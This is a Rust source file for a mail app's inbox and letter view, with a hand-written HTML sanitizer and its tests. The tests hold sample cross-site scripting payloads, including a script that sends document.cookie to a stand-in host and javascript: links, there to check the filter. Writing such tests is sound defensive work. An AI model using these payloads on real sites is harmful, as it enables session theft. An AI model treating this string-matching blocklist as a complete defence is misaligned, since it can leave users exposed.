// The Mail page's inbox, from the mail kept on this computer (store.rs),
// with no wait for the server: conversations (threads.rs), one account's or
// every account's as one; all, the unread or the starred. A letter read
// whole: as kept, else from the server (then kept). Opening one on the page
// marks it read, as any mail program does (here at once, on the server just
// after); listing does not, nor does handing one to an agent. A star the
// same way, back as it was when the server says no.
use std::borrow::Cow;
use std::sync::Arc;

use io_imap::types::flag::Flag;
use mail_parser::{Address, Message, MessageParser, MimeHeaders};
use serde_json::{json, Value};
use tauri::AppHandle;

use super::imap::{self, session, Fail};
use super::store::{self, Folder};
use super::{account, accounts, agent, password_of, status_of, threads, Account, CONNECT};
use crate::{shared, Shared};

// The most conversations at once, and the most of a letter's text sent to
// the page.
const MOST: u32 = 2000;
const MOST_TEXT: usize = 100_000;

pub fn parse(raw: &[u8]) -> Option<Message<'_>> {
    MessageParser::default().parse(raw)
}

// The people in a header, as { name, address }.
pub fn people(list: Option<&Address>) -> Vec<Value> {
    list.map(|a| a.iter().map(|p| json!({ "name": p.name().unwrap_or("").trim(), "address": p.address().unwrap_or("").trim() })).collect()).unwrap_or_default()
}

// When it was sent (ms).
fn when(m: &Message) -> Option<i64> {
    m.date().map(|d| d.to_timestamp() * 1000)
}

// A letter's text: its plain part, else its HTML made plain; lines ending
// in \n and no more than one blank line in a row.
pub fn text(m: &Message) -> String {
    let body = m.body_text(0).unwrap_or(Cow::Borrowed(""));
    let mut out = String::with_capacity(body.len());
    let mut blank = 0;
    for line in body.replace("\r\n", "\n").split('\n') {
        let line = line.trim_end();
        blank = if line.is_empty() { blank + 1 } else { 0 };
        if blank < 2 {
            out.push_str(line);
            out.push('\n');
        }
    }
    out.trim().to_string()
}

// A letter's HTML, as it is drawn: its own styles, its own layout, its
// pictures. What is dangerous in it is taken out first — a letter is written
// by whoever sent it, and it is shown in her window, on the person's
// computer.
//
// Taken out: scripts (and the javascript: they call), the frames and the
// objects, the forms and the inputs, and the attributes that begin with
// "on" (a click that runs something). The styles and the pictures are left:
// they are what a letter is made of. The page shows it in a sandboxed frame
// as well, so that what is left cannot reach her.
pub fn html(m: &Message) -> String {
    let body = m.body_html(0).unwrap_or(Cow::Borrowed(""));
    // A letter's HTML is not endless: what is past this is not shown (the
    // plain text is, which is the same letter in words).
    const MOST_HTML: usize = 1 << 20;
    let body: String = body.chars().take(MOST_HTML).collect();
    sanitize_html(&body)
}

// The parts that are taken out whole: a script with its text, a frame, an
// object, a form. A style is kept (its text is css).
const DROPPED: [(&str, &str); 4] = [("<script", "</script"), ("<iframe", "</iframe"), ("<object", "</object"), ("<form", "</form")];
const DROPPED_VOID: [&str; 2] = ["<embed", "</embed"];

fn sanitize_html(raw: &str) -> String {
    let lower = raw.to_ascii_lowercase();
    let mut out = String::with_capacity(raw.len());
    let mut at = 0usize;
    loop {
        // The earliest of the parts to take out.
        let mut found: Option<(usize, bool, usize)> = None;
        for (i, (open, _)) in DROPPED.iter().enumerate() {
            if let Some(p) = lower[at..].find(open) {
                let p = at + p;
                if found.map_or(true, |(b, _, _)| p < b) {
                    found = Some((p, false, i));
                }
            }
        }
        for (i, tag) in DROPPED_VOID.iter().enumerate() {
            if let Some(p) = lower[at..].find(tag) {
                let p = at + p;
                if found.map_or(true, |(b, _, _)| p < b) {
                    found = Some((p, true, i));
                }
            }
        }
        let Some((start, is_void, which)) = found else {
            out.push_str(&raw[at..]);
            break;
        };
        out.push_str(&raw[at..start]);
        let Some(tag_end) = lower[start..].find('>').map(|i| start + i + 1) else {
            out.push_str(&raw[start..]);
            break;
        };
        if is_void {
            at = tag_end;
        } else {
            let (_, close) = DROPPED[which];
            let body_start = tag_end;
            let stop = lower[body_start..].find(close).map(|e| body_start + e).unwrap_or(raw.len());
            let after = lower[stop..].find('>').map(|i| stop + i + 1).unwrap_or(raw.len());
            at = after;
        }
    }
    // And in what is left, the attributes that run something, and a meta
    // that would send the frame somewhere else.
    let out = clean_tags(&out);
    let mut out = out;
    let mut search_from = 0;
    loop {
        let lower = out.to_ascii_lowercase();
        let Some(pos) = lower[search_from..].find("<meta") else { break };
        let at = search_from + pos;
        let Some(end) = lower[at..].find('>').map(|i| at + i + 1) else { break };
        let tag = &lower[at..end];
        if tag.contains("http-equiv") {
            out.replace_range(at..end, "");
        } else {
            search_from = end;
        }
    }
    out
}

// The attributes that begin with "on" (a click that runs a script) are
// taken out; the ones that are an address (href, src, ...) keep their name
// but lose a javascript: address.
fn clean_tags(html: &str) -> String {
    let mut out = String::with_capacity(html.len());
    let mut rest = html;
    loop {
        let Some(lt) = rest.find('<') else {
            out.push_str(rest);
            break;
        };
        out.push_str(&rest[..lt]);
        let tag_start = lt;
        let Some(gt) = rest[tag_start..].find('>').map(|i| tag_start + i) else {
            out.push_str(&rest[tag_start..]);
            break;
        };
        let tag = &rest[tag_start..=gt];
        out.push_str(&clean_tag(tag));
        rest = &rest[gt + 1..];
    }
    out
}

fn clean_tag(tag: &str) -> String {
    // The attributes that are an address: a javascript: in one is taken out.
    const ADDRESS: [&str; 6] = ["href", "src", "action", "formaction", "poster", "background"];
    let mut out = String::with_capacity(tag.len());
    let mut rest = tag;
    while let Some(at) = rest.find('=') {
        // The name before it: back to the space or to the tag's name.
        let before = rest[..at].trim_end();
        let name_start = before.rfind(|c: char| c.is_whitespace() || c == '<' || c == '/').map(|i| i + 1).unwrap_or(0);
        let name = before[name_start..].to_ascii_lowercase();

        // The value after it: skip any whitespace after '='
        let val_offset = rest[at + 1..].find(|c: char| !c.is_whitespace()).unwrap_or(rest[at + 1..].len());
        let value_start = at + 1 + val_offset;

        if value_start >= rest.len() || rest[value_start..].starts_with('>') {
            out.push_str(&rest[..at + 1]);
            rest = &rest[at + 1..];
            continue;
        }

        // The value, quoted or not.
        let quote = rest[value_start..].chars().next().unwrap_or(' ');
        let (value, next) = if quote == '"' || quote == '\'' {
            let after_quote = value_start + quote.len_utf8();
            match rest[after_quote..].find(quote) {
                Some(e) => (&rest[after_quote..after_quote + e], after_quote + e + quote.len_utf8()),
                None => (&rest[after_quote..], rest.len()),
            }
        } else {
            let v_end = rest[value_start..].find(|c: char| c.is_whitespace() || c == '>').map(|e| value_start + e).unwrap_or(rest.len());
            (&rest[value_start..v_end], v_end)
        };
        let norm_val = value.chars().filter(|c| !c.is_whitespace() && !c.is_ascii_control()).collect::<String>().to_ascii_lowercase();
        let js = norm_val.starts_with("javascript:") || norm_val.starts_with("vbscript:") || norm_val.starts_with("data:text/html");
        if name.starts_with("on") {
            // The attribute is taken out whole.
            out.push_str(&rest[..name_start]);
            rest = &rest[next..];
            continue;
        }
        if js && ADDRESS.contains(&name.as_str()) {
            // The name stays, the address goes.
            out.push_str(&rest[..value_start]);
            out.push_str("\"about:blank\"");
            rest = &rest[next..];
            continue;
        }
        out.push_str(&rest[..next]);
        rest = &rest[next..];
    }
    out.push_str(rest);
    out
}

// A letter's attachments: name, size, type.
pub fn attachments(m: &Message) -> Vec<Value> {
    m.attachments()
        .map(|a| {
            let kind = a.content_type().map(|t| format!("{}/{}", t.ctype(), t.subtype().unwrap_or(""))).unwrap_or_default();
            json!({ "name": a.attachment_name().unwrap_or(""), "size": a.contents().len(), "type": kind })
        })
        .collect()
}

// Which conversations the inbox shows: all, those with a letter unread, or
// with one starred.
#[derive(Clone, Copy, PartialEq, Debug)]
pub enum Filter {
    All,
    Unseen,
    Flagged,
}

impl Filter {
    fn parse(s: &str) -> Filter {
        match s {
            "unseen" => Filter::Unseen,
            "flagged" => Filter::Flagged,
            _ => Filter::All,
        }
    }
}

// The accounts' conversations as kept, newest first (by their newest
// letter): the first `count`, how many there are, how many letters the
// inbox holds; the accounts that cannot be reached, with why; whether a
// first sync is still under way.
fn list(sh: &Shared, all: Vec<Account>, count: u32, filter: Filter) -> Value {
    let statuses: Vec<(Account, Value)> = all
        .into_iter()
        .map(|a| {
            let status = status_of(sh, &a.id);
            (a, status)
        })
        .collect();
    let (mut threads, mut letters, mut errors, mut syncing) = (Vec::new(), 0, Vec::new(), false);
    for (a, status) in &statuses {
        let st = store::of(sh, a);
        let s = st.lock().unwrap();
        threads.extend(threads::build(a, &s, filter));
        letters += s.inbox.letters.len();
        if status["state"] == "error" {
            errors.push(json!({ "account": a.id, "error": status["error"] }));
        } else if a.on && !s.synced[0] {
            syncing = true;
        }
    }
    threads.sort_by_key(|t| std::cmp::Reverse(t["latest"].as_i64().unwrap_or(0)));
    let total = threads.len();
    threads.truncate(count.clamp(1, MOST) as usize);
    json!({ "ok": true, "total": total, "letters": letters, "threads": threads, "errors": errors, "syncing": syncing })
}

// A letter whole: as kept, else from the server (then kept).
pub fn raw(sh: &Shared, account: &Account, folder: Folder, uid: u32) -> Result<Option<Vec<u8>>, Fail> {
    let st = store::of(sh, account);
    let (kept, name) = {
        let s = st.lock().unwrap();
        (s.body(folder, uid), s.get(folder).mailbox.clone())
    };
    if kept.is_some() {
        return Ok(kept);
    }
    let mailbox = imap::mailbox(&name).ok_or_else(|| Fail::Other("no such folder".into()))?;
    let mut s = session(&account.server, &password_of(account)?, CONNECT)?;
    s.folder(mailbox, false)?;
    let got = s.letter(uid)?;
    s.logout();
    if let Some((raw, _)) = &got {
        let mut s = st.lock().unwrap();
        s.keep_body(folder, uid, raw, true);
        s.save();
    }
    Ok(got.map(|(raw, _)| raw))
}

// A flag put on a letter or taken off: here at once, then on the server;
// back as it was when the server says no.
pub fn set_flag(sh: &Shared, account: &Account, folder: Folder, uid: u32, flag: Flag<'static>, what: &str, on: bool) -> Result<(), Fail> {
    let st = store::of(sh, account);
    let name = {
        let mut s = st.lock().unwrap();
        s.set_flag(folder, uid, what, on);
        s.get(folder).mailbox.clone()
    };
    let told = (|| -> Result<(), Fail> {
        let mailbox = imap::mailbox(&name).ok_or_else(|| Fail::Other("no such folder".into()))?;
        let mut s = session(&account.server, &password_of(account)?, CONNECT)?;
        s.folder(mailbox, true)?;
        s.set_flag(uid, flag, on)?;
        s.logout();
        Ok(())
    })();
    let mut s = st.lock().unwrap();
    if told.is_err() {
        s.set_flag(folder, uid, what, !on);
    }
    s.save();
    told
}

// A letter for the page.
fn view(m: &Message) -> Value {
    let text = text(m);
    let cut = text.char_indices().nth(MOST_TEXT).map_or(text.as_str(), |(at, _)| &text[..at]);
    json!({
        "from": people(m.from()),
        "to": people(m.to()),
        "cc": people(m.cc()),
        "replyTo": people(m.reply_to()),
        "references": m.references().as_text_list().map(|l| l.iter().map(|r| r.trim()).filter(|r| !r.is_empty()).collect::<Vec<_>>()).unwrap_or_default(),
        "subject": m.subject().unwrap_or("").trim(),
        "date": when(m),
        "messageId": m.message_id().unwrap_or(""),
        "text": cut,
        "cut": cut.len() < text.len(),
        // The letter's own HTML, as it is drawn: its styles, its layout, its
        // pictures (what is dangerous in it is taken out first).
        "html": html(m),
        "attachments": attachments(m),
    })
}

fn failed(fail: Fail) -> Value {
    json!({ "ok": false, "error": fail.json() })
}

fn gone() -> Value {
    json!({ "ok": false, "error": { "kind": "gone", "text": "" } })
}

// The inbox's conversations: one account's, or ("*") every account's as one.
#[tauri::command]
pub async fn mail_letters(app: AppHandle, id: String, count: u32, filter: String) -> Value {
    let sh = shared(&app);
    let filter = Filter::parse(&filter);
    let all: Vec<Account> = accounts(&sh).into_iter().filter(|a| id == "*" || a.id == id).collect();
    if all.is_empty() && id != "*" {
        return gone();
    }
    tauri::async_runtime::spawn_blocking(move || list(&sh, all, count, filter)).await.unwrap_or_else(|e| failed(Fail::Other(e.to_string())))
}

// A letter starred, or not any more.
#[tauri::command]
pub async fn mail_flag(app: AppHandle, id: String, uid: u32, on: bool, folder: Option<String>) -> Value {
    let sh = shared(&app);
    let Some(account) = account(&sh, &id) else { return gone() };
    let folder = Folder::parse(folder.as_deref().unwrap_or(""));
    let got = tauri::async_runtime::spawn_blocking(move || set_flag(&sh, &account, folder, uid, Flag::Flagged, "flagged", on)).await.unwrap_or_else(|e| Err(Fail::Other(e.to_string())));
    match got {
        Ok(()) => json!({ "ok": true }),
        Err(fail) => failed(fail),
    }
}

// A letter opened on the page: read whole (as kept, or from the server) and
// marked read (here at once, on the server just after); with its talk with
// an agent, if there is one.
#[tauri::command]
pub async fn mail_letter(app: AppHandle, id: String, uid: u32, folder: Option<String>) -> Value {
    let sh = shared(&app);
    let Some(account) = account(&sh, &id) else { return gone() };
    let folder = Folder::parse(folder.as_deref().unwrap_or(""));
    let (sh2, a) = (sh.clone(), account.clone());
    let got = tauri::async_runtime::spawn_blocking(move || raw(&sh2, &a, folder, uid)).await.unwrap_or_else(|e| Err(Fail::Other(e.to_string())));
    let raw = match got {
        Ok(Some(raw)) => raw,
        Ok(None) => return json!({ "ok": false, "error": { "kind": "noLetter", "text": "" } }),
        Err(fail) => return failed(fail),
    };
    let Some(m) = parse(&raw) else { return json!({ "ok": false, "error": { "kind": "other", "text": "unreadable" } }) };
    let (seen, flagged) = {
        let st = store::of(&sh, &account);
        let mut s = st.lock().unwrap();
        // Opened: kept, whatever is kept offline.
        s.opened(folder, uid);
        s.get(folder).letters.get(&uid).map_or((false, false), |e| (e.seen, e.flagged))
    };
    if !seen {
        let (sh2, a) = (Arc::clone(&sh), account.clone());
        std::thread::spawn(move || {
            if let Err(fail) = set_flag(&sh2, &a, folder, uid, Flag::Seen, "seen", true) {
                sh2.log(&format!("mail {}: letter {uid} not marked read: {fail:?}", a.id));
            }
        });
    }
    let mut letter = view(&m);
    letter["uid"] = json!(uid);
    let key = agent::key(&id, uid, m.message_id());
    letter["key"] = json!(key);
    letter["account"] = json!(id);
    letter["folder"] = json!(folder.name());
    letter["flagged"] = json!(flagged);
    json!({ "ok": true, "letter": letter, "talk": agent::talk_view(&sh, &key) })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_letter_reads_as_text_and_attachments() {
        let raw = b"From: \"Zhang San\" <zs@vendor.example>\r\nTo: me@example.test, Li <li@example.test>\r\nSubject: =?UTF-8?B?5ZCI5ZCM?=\r\nDate: Fri, 09 Oct 2026 10:15:00 +0800\r\nMessage-ID: <c4@vendor.example>\r\nContent-Type: multipart/mixed; boundary=b\r\n\r\n--b\r\nContent-Type: text/plain; charset=utf-8\r\n\r\nline one\r\n\r\n\r\n\r\nline two   \r\n--b\r\nContent-Type: text/plain; name=notes.txt\r\nContent-Disposition: attachment; filename=notes.txt\r\n\r\nabc\r\n--b--\r\n";
        let m = parse(raw).unwrap();
        assert_eq!(text(&m), "line one\n\nline two");
        let v = view(&m);
        assert_eq!(v["subject"], "合同");
        assert_eq!(v["to"][1], json!({ "name": "Li", "address": "li@example.test" }));
        assert_eq!(v["attachments"][0]["name"], "notes.txt");
        assert_eq!((v["replyTo"].as_array().map(Vec::len), v["references"].as_array().map(Vec::len)), (Some(0), Some(0)));
        let replied = parse(b"From: a@b.test\r\nReply-To: List <list@b.test>\r\nReferences: <r1@x> <r2@x>\r\nSubject: s\r\n\r\nhi\r\n").unwrap();
        assert_eq!((view(&replied)["replyTo"][0]["address"].as_str(), view(&replied)["references"].clone()), (Some("list@b.test"), json!(["r1@x", "r2@x"])));
        assert_eq!(v["date"], 1_791_512_100_000i64);
    }

    // A letter's HTML is shown as it is written: its styles, its layout, its
    // pictures. What is dangerous in it is taken out first, because it is
    // written by whoever sent it and it is shown on the person's computer.
    #[test]
    fn a_letters_html_is_shown_but_its_scripts_are_not() {
        let raw = b"From: a@b.test\r\nSubject: s\r\nContent-Type: text/html; charset=utf-8\r\n\r\n<html><head><style>.a{color:red}</style></head><body><div class=\"a\">\xe6\x97\xa5\xe6\x9c\xac</div><script>fetch('http://evil.test/'+document.cookie)</script><img src=\"http://track.test/p.gif\"></body></html>\r\n";
        let m = parse(raw).unwrap();
        let h = html(&m);
        // What it is made of is kept: the styles, the text, the picture.
        assert!(h.contains(".a{color:red}"), "the styles are kept: {h}");
        assert!(h.contains("日本"), "the text is kept: {h}");
        assert!(h.contains("track.test/p.gif"), "the pictures are kept: {h}");
        // What could run is not.
        assert!(!h.contains("<script"), "no script: {h}");
        assert!(!h.contains("document.cookie"), "nothing of the script is left: {h}");
        // And the letter's own text still reads as it is.
        assert!(text(&m).contains("日本"));
    }

    #[test]
    fn the_things_that_could_run_are_taken_out() {
        // A click that runs a script.
        let h = super::sanitize_html(r#"<a href="https://ok.test" onclick="steal()">x</a>"#);
        assert!(!h.contains("onclick"), "{h}");
        assert!(!h.contains("steal()"), "{h}");
        assert!(h.contains("https://ok.test"), "the address is kept: {h}");
        // A javascript: address.
        let h = super::sanitize_html(r#"<a href="javascript:steal()">x</a>"#);
        assert!(!h.to_lowercase().contains("javascript:"), "{h}");
        // A frame, an object, an embed.
        for tag in ["iframe", "object", "embed"] {
            let h = super::sanitize_html(&format!("<{t} src=\"http://x.test\"></{t}>after", t = tag));
            assert!(!h.contains("x.test"), "{tag}: {h}");
            assert!(h.contains("after"), "{tag}: {h}");
        }
        // A form is not kept: what it posts is not hers to post.
        let h = super::sanitize_html(r#"<form action="http://x.test"><input name="a"></form>"#);
        assert!(!h.contains("<form"), "{h}");
        // The text around is not touched.
        let h = super::sanitize_html("<p>hello <b>there</b></p>");
        assert_eq!(h, "<p>hello <b>there</b></p>");
    }
}
